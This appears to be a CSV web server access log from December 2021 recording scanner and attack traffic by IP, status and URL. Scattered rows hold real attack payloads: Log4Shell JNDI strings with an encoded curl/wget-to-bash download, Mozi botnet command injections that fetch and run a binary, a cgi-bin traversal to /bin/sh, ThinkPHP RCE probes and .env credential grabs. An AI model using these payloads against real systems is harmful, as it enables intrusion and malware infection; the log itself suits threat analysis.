"Source","StatusCode","Timestamp","URL"
"157.245.70.127","415","1639588663720","/ab2g"
"157.245.70.127","415","1639588668739","/ab2h"
"195.54.160.149","415","1639590876742","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"167.248.133.113","200","1639592084986","/"
"167.248.133.113","200","1639592085173","/"
"34.159.253.246","200","1639592086869","/"
"34.159.253.246","415","1639592094092","/HNAP1/"
"34.65.99.219","200","1639593465424","/"
"209.17.96.210","200","1639594102297","/"
"23.94.83.68","200","1639594673219","/"
"20.55.53.144","200","1639594858400","/"
"20.211.30.34","415","1639594978491","/pv/spa122.cfg"
"85.202.169.115","200","1639595840871","/"
"34.140.1.37","200","1639598078088","/"
"34.140.1.37","415","1639598086102","/HNAP1/"
"136.144.41.117","200","1639598701418","/"
"34.65.54.135","200","1639600203639","/"
"34.65.54.135","415","1639600203735","/HNAP1/"
"34.105.181.116","200","1639600692889","/"
"34.105.181.116","415","1639600700080","/HNAP1/"
"186.33.79.172","200","1639602840714","/"
"34.116.165.138","200","1639602931326","/"
"34.116.165.138","415","1639602931715","/HNAP1/"
"185.180.143.8","200","1639603466411","/"
"83.4.14.250","415","1639606540827","/phpmyadmin/"
"34.89.18.225","200","1639610104600","/"
"34.89.18.225","415","1639610113616","/HNAP1/"
"209.141.50.223","415","1639610318421","/config/getuser?index=0"
"20.62.171.235","200","1639613587554","/"
"20.62.171.235","200","1639613587744","/"
"20.62.171.235","200","1639613587914","/"
"20.62.171.235","415","1639613588233","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"198.98.49.124","415","1639614395998","/config/getuser?index=0"
"35.246.93.126","200","1639614776012","/"
"35.246.93.126","415","1639614778333","/HNAP1/"
"178.79.150.200","200","1639615906878","/"
"64.62.197.62","200","1639616236105","/"
"45.61.186.9","415","1639619719135","/data6688/open/getCompanyInfo"
"23.183.83.15","415","1639619969278","/data6688/open/getCompanyInfo"
"139.59.70.139","200","1639622349825","/"
"45.137.23.232","200","1639622560883","/"
"199.195.253.57","415","1639623204232","/authority/login"
"23.183.83.160","200","1639623656399","/"
"23.183.83.160","415","1639623670334","/HNAP1/"
"209.17.97.58","200","1639625913632","/"
"186.33.73.185","200","1639628406276","/"
"193.118.53.202","200","1639628785613","/"
"14.242.160.164","200","1639631190586","/"
"162.142.125.194","200","1639631422711","/"
"162.142.125.194","200","1639631422942","/"
"198.98.49.124","200","1639632500120","/"
"179.43.175.101","200","1639634571700","/"
"139.59.70.139","200","1639635713243","/"
"45.61.185.22","415","1639636154120","/data6688/open/getCompanyInfo"
"104.244.73.9","200","1639636813911","/"
"45.134.225.15","200","1639637348028","/"
"195.54.160.149","415","1639639661753","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"197.232.21.221","200","1639640554858","/"
"154.89.5.68","200","1639642153449","/"
"195.54.160.149","415","1639643405565","/solr/admin/info/system?wt=json"
"45.227.254.14","200","1639643718826","/"
"45.83.67.37","200","1639643939508","/"
"45.83.67.199","200","1639643939565","/ico.png"
"47.114.145.167","200","1639645168172","/"
"195.181.83.222","200","1639645394321","/"
"185.189.91.26","200","1639646642385","/"
"195.54.160.149","415","1639648945415","/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>"
"195.54.160.149","415","1639652980997","/console/"
"23.251.102.82","200","1639653312644","/"
"34.142.19.18","200","1639653698042","/"
"34.142.19.18","415","1639653698048","/HNAP1/"
"23.183.83.160","200","1639654996399","/"
"23.183.83.160","415","1639655005840","/HNAP1/"
"34.65.195.42","200","1639655270718","/"
"34.65.195.42","415","1639655270849","/HNAP1/"
"195.54.160.149","415","1639655727259","/Autodiscover/Autodiscover.xml"
"139.59.70.139","200","1639656935161","/"
"195.54.160.149","415","1639657401113","/_ignition/execute-solution"
"23.183.81.139","200","1639660528145","/"
"195.54.160.149","415","1639661989710","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"23.251.102.74","200","1639662888705","/"
"23.183.83.18","415","1639663608933","/authority/login"
"159.65.63.130","415","1639665999732","/.env"
"159.65.63.130","200","1639665999739","/"
"195.54.160.149","415","1639666265765","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"120.85.115.83","415","1639669244951","/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
"5.8.10.202","200","1639670817501","/"
"128.14.141.34","200","1639676858802","/"
"209.141.50.223","415","1639677679554","/config/getuser?index=0"
"172.104.138.223","415","1639679825822","/fuN3"
"34.142.52.49","200","1639681334067","/"
"213.149.28.227","200","1639684165232","/"
"119.251.14.20","415","1639686023523","/shell?cd+/tmp;rm+-rf+*;wget+http://119.251.14.20:50933/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
"186.33.79.114","200","1639688995304","/"
"186.33.79.114","200","1639688995307","/"
"209.17.96.10","200","1639692011400","/"
"120.86.252.103","415","1639693511217","/GponForm/diag_Form?images/"
"186.33.73.14","200","1639695911928","/"
"34.105.206.192","200","1639696023429","/"
"34.105.206.192","415","1639696023460","/HNAP1/"
"162.142.125.58","200","1639696646119","/"
"162.142.125.58","200","1639696646489","/"
"35.198.152.16","200","1639697109043","/"
"35.198.152.16","415","1639697109073","/HNAP1/"
"185.234.231.211","200","1639697956098","/"
"190.57.128.110","200","1639698682912","/"
"192.227.211.221","200","1639699261431","/"
"20.62.171.81","200","1639699836718","/"
"20.62.171.81","200","1639699836900","/"
"20.62.171.81","200","1639699837067","/"
"20.62.171.81","415","1639699837386","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"5.157.38.50","415","1639700612659","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"5.157.38.50","200","1639700612692","/"
"5.157.38.50","415","1639700612725","/login"
"5.157.38.50","200","1639700612772","/"
"139.162.145.250","415","1639701104023","/bag2"
"34.105.160.57","200","1639701552407","/"
"34.105.160.57","415","1639701552502","/HNAP1/"
"205.185.124.100","415","1639704991188","/boaform/admin/formLogin"
"45.83.65.234","415","1639705071653","/?id=%24%7B%24%7B%3A%3A-j%7Dndi%3Adns%3A%2F%2F45.83.64.1%2Fsecurityscan-sftpxrzh33pfybon%7D"
"45.83.66.68","200","1639705071710","/"
"114.255.88.84","200","1639705938422","/"
"193.118.53.210","200","1639707237670","/"
"20.55.115.145","415","1639707311268","/.env"
"20.55.115.145","200","1639707311534","/"
"205.185.124.100","415","1639707313815","/boaform/admin/formLogin"
"45.134.225.15","200","1639707790135","/"
"112.255.19.14","415","1639710795552","/HNAP1/"
"195.54.160.149","415","1639714794361","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"209.17.97.98","200","1639715034565","/"
"4.17.224.131","415","1639716679105","/.env"
"4.17.224.131","200","1639716679509","/"
"195.54.160.149","415","1639717184626","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"34.140.248.32","200","1639717345141","/"
"195.54.160.149","415","1639718790235","/solr/admin/info/system?wt=json"
"104.206.128.38","200","1639719755542","/"
"23.183.81.15","404","1639720392587","/mainPage.html"
"23.183.81.122","404","1639720785605","/mainPage.html"
"195.54.160.149","415","1639720797232","/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21"
"104.244.73.250","415","1639722930397","/wp-content/uploads/2020/12/Re-Zero-Kara-Hajimeru-Isekai-Seikatsu-season-2-185x278.jpg"
"23.183.83.160","200","1639723088528","/"
"23.183.83.160","415","1639723098219","/HNAP1/"
"195.54.160.149","415","1639723307941","/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>"
"42.235.95.149","415","1639724239428","/boaform/admin/formLogin?username=admin&psd=admin"
"195.54.160.149","415","1639724925597","/?XDEBUG_SESSION_START=phpstorm"
"185.254.196.223","415","1639727046652","/.env"
"185.254.196.223","200","1639727056952","/"
"195.54.160.149","415","1639727439781","/console/"
"195.54.160.149","415","1639729446962","/Autodiscover/Autodiscover.xml"
"198.199.104.21","415","1639729863149","/ReportServer"
"185.254.196.223","415","1639730792827","/.env"
"185.254.196.223","200","1639730795245","/"
"162.142.125.57","200","1639732315789","/"
"162.142.125.57","200","1639732316018","/"
"137.184.218.211","200","1639732411404","/"
"195.54.160.149","415","1639732452345","/_ignition/execute-solution"
"34.159.196.246","200","1639733178155","/"
"34.159.196.246","415","1639733178185","/HNAP1/"
"157.245.70.127","415","1639734059566","/ab2g"
"157.245.70.127","415","1639734064589","/ab2h"
"195.54.160.149","200","1639734582873","/"
"65.49.20.69","200","1639735013207","/"
"195.54.160.149","415","1639735402540","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"128.14.134.170","200","1639737105439","/"
"209.141.50.223","415","1639737239680","/config/getuser?index=0"
"185.254.196.223","415","1639739032901","/.env"
"185.254.196.223","200","1639739033001","/"
"195.54.160.149","200","1639739091223","/"
"118.44.8.11","415","1639739557902","/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://118.44.8.11:44088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
"195.54.160.149","415","1639741012887","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"192.241.211.90","200","1639743898286","/"
"209.141.50.223","415","1639748746860","/config/getuser?index=0"
"183.136.226.4","200","1639749201834","/"
"188.190.221.115","200","1639750858965","/"
"185.254.196.223","415","1639751098279","/.env"
"185.254.196.223","200","1639751100357","/"
"103.233.88.158","200","1639751466089","/"
"73.222.79.229","200","1639755076665","/"
"138.197.196.173","200","1639755090132","/"
"128.14.134.170","200","1639759706101","/"
"185.142.236.40","200","1639762055064","/"
"185.142.236.40","415","1639762055415","/robots.txt"
"185.142.236.40","415","1639762055836","/sitemap.xml"
"185.142.236.40","415","1639762056726","/.well-known/security.txt"
"185.142.236.40","200","1639762059202","/ico.png"
"130.211.54.158","200","1639762067236","/"
"162.142.125.194","200","1639763649584","/"
"162.142.125.194","200","1639763649766","/"
"2.56.57.56","200","1639766020291","/"
"2.56.57.56","415","1639766025793","/HNAP1/"
"192.241.207.46","415","1639766059590","/portal/redlion"
"185.254.196.223","415","1639768427165","/.env"
"185.254.196.223","200","1639768441491","/"
"185.220.101.12","200","1639772745871","/"
"18.27.197.252","404","1639772755927","/favicon.ico"
"185.254.196.223","415","1639773897395","/.env"
"185.254.196.223","200","1639773900423","/"
"186.33.80.130","200","1639775385831","/"
"223.130.31.89","415","1639777140679","/GponForm/diag_Form?images/"
"111.59.85.209","200","1639777316324","/"
"111.59.85.209","200","1639777316585","/"
"111.59.85.209","200","1639777316849","/"
"111.59.85.209","200","1639777317116","/"
"61.52.86.65","415","1639777317455","http://110.242.68.4/"
"162.208.49.249","415","1639778753696","/_ignition/execute-solution"
"45.95.147.17","200","1639778990895","/"
"180.149.125.170","200","1639781843404","/"
"104.152.52.160","200","1639784971624","/"
"20.62.168.196","200","1639786623603","/"
"20.62.168.196","200","1639786623791","/"
"20.62.168.196","200","1639786623958","/"
"20.62.168.196","415","1639786624286","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"197.246.175.231","415","1639787854228","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"197.246.175.231","415","1639787861637","/login"
"197.246.175.231","200","1639787862140","/"
"195.54.160.149","415","1639789666482","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"195.54.160.149","415","1639790217672","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"195.54.160.149","415","1639792168441","/solr/admin/info/system?wt=json"
"64.62.197.62","200","1639794572993","/"
"142.93.146.198","415","1639795669971","/postsniffer"
"185.128.41.50","415","1639795853253","/invoker/readonly"
"198.23.200.23","415","1639797298294","/.env"
"198.23.200.23","200","1639797299814","/"
"195.54.160.149","415","1639797542785","/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>"
"198.23.200.23","415","1639798043746","/.env"
"198.23.200.23","200","1639798045224","/"
"195.54.160.149","415","1639798366388","/?XDEBUG_SESSION_START=phpstorm"
"185.254.196.223","415","1639799771118","/.env"
"185.254.196.223","200","1639799779371","/"
"195.54.160.149","415","1639800537160","/console/"
"180.149.125.168","415","1639802994207","/stalker_portal/server/tools/auth_simple.php"
"209.17.97.2","200","1639803868807","/"
"185.254.196.223","415","1639804339968","/.env"
"185.254.196.223","200","1639804342234","/"
"195.54.160.149","415","1639805057054","/_ignition/execute-solution"
"195.54.160.149","200","1639806552925","/"
"34.140.248.32","200","1639806556861","/"
"195.54.160.149","415","1639809336065","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"138.68.84.78","200","1639810300929","/"
"128.14.134.134","200","1639810811825","/"
"209.17.96.154","200","1639811004501","/"
"197.254.60.42","200","1639811924544","/"
"195.54.160.149","200","1639812342812","/"
"77.37.134.80","415","1639813244265","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"77.37.134.80","200","1639813244322","/"
"77.37.134.80","415","1639813244389","/login"
"77.37.134.80","200","1639813244451","/"
"195.54.160.149","415","1639814236079","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"185.254.196.223","415","1639814817804","/.env"
"185.254.196.223","200","1639814817899","/"
"167.94.138.116","200","1639815538373","/"
"167.94.138.116","200","1639815538623","/"
"45.61.186.12","415","1639815677175","/?9766"
"170.247.74.127","200","1639816293045","/"
"162.221.192.90","200","1639818808141","/"
"162.221.192.90","415","1639818808454","/fuel"
"199.195.250.138","404","1639819346124","/mainPage.html?10133"
"123.129.8.211","415","1639823478608","/GponForm/diag_Form?images/"
"109.237.103.123","415","1639823566861","/.env"
"1.116.59.211","415","1639824247744","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"1.116.59.211","200","1639824247974","/"
"1.116.59.211","415","1639824248194","/login"
"1.116.59.211","200","1639824248429","/"
"1.202.113.231","415","1639824274060","http://110.242.68.4/"
"159.89.26.34","200","1639825467054","/"
"185.254.196.223","415","1639828934722","/.env"
"185.254.196.223","200","1639828956838","/"
"92.118.161.13","200","1639829585823","/"
"192.241.215.91","200","1639830402951","/"
"198.98.61.28","404","1639831328473","/m/images/template_1/style_1/logo1.png"
"51.79.29.48","200","1639832147601","/"
"51.79.29.48","415","1639832147792","/.env"
"167.248.133.115","200","1639833074296","/"
"167.248.133.115","200","1639833074484","/"
"36.67.198.7","200","1639833306495","/"
"134.209.159.8","200","1639839152955","/"
"134.209.159.8","415","1639839153346","/system_api.php"
"134.209.159.8","404","1639839156095","/c/version.js"
"134.209.159.8","415","1639839158820","/streaming/clients_live.php"
"134.209.159.8","404","1639839161576","/stalker_portal/c/version.js"
"134.209.159.8","415","1639839164304","/stream/live.php"
"134.209.159.8","404","1639839167034","/flu/403.html"
"134.209.159.8","200","1639839169782","/"
"151.242.26.226","200","1639841812716","/"
"162.142.125.59","200","1639845583041","/"
"162.142.125.59","200","1639845583289","/"
"128.14.141.34","415","1639845727906","/Telerik.Web.UI.WebResource.axd?type=rau"
"186.33.84.69","200","1639846084014","/"
"103.144.149.212","200","1639846925545","/"
"103.144.149.212","200","1639846925796","/public.css"
"103.144.149.212","200","1639846926014","/public.js"
"103.144.149.212","200","1639846926018","/jquery-3-6-0-min.js"
"103.144.149.212","200","1639846926819","/getbasicinfo.ajax"
"103.144.149.212","200","1639846927047","/login.html"
"103.144.149.212","200","1639846927288","/public.css"
"103.144.149.212","200","1639846927291","/jquery-3-6-0-min.js"
"103.144.149.212","200","1639846927300","/hash.js"
"103.144.149.212","200","1639846927511","/public.js"
"103.144.149.212","200","1639846927734","/UOP.png"
"103.144.149.212","200","1639846928076","/UOP2.png"
"103.144.149.212","200","1639846930248","/login.ajax?Username=qc5111&Password=d6ae33474b8621b5afce6fe38550b59d4d189151"
"103.144.149.212","200","1639846931478","/index.html"
"103.144.149.212","200","1639846931722","/jquery-3-6-0-min.js"
"103.144.149.212","200","1639846931723","/public.js"
"103.144.149.212","200","1639846931724","/public.css"
"103.144.149.212","200","1639846932343","/getbasicinfo.ajax"
"103.144.149.212","200","1639846938228","/channel.html"
"103.144.149.212","200","1639846938476","/public.css"
"103.144.149.212","200","1639846938697","/public.js"
"103.144.149.212","200","1639846938699","/jquery-3-6-0-min.js"
"103.144.149.212","200","1639846938922","/UOP.png"
"103.144.149.212","200","1639846939332","/UOP2.png"
"103.144.149.212","200","1639846939343","/getbasicinfo.ajax"
"49.143.32.6","415","1639853581539","/GponForm/diag_Form?images/"
"165.227.11.20","415","1639854872800","/3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000"
"165.227.11.20","415","1639854874107","/3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000"
"165.227.11.20","200","1639854875175","/"
"165.227.11.20","200","1639854876481","/"
"2.187.7.13","200","1639854989543","/"
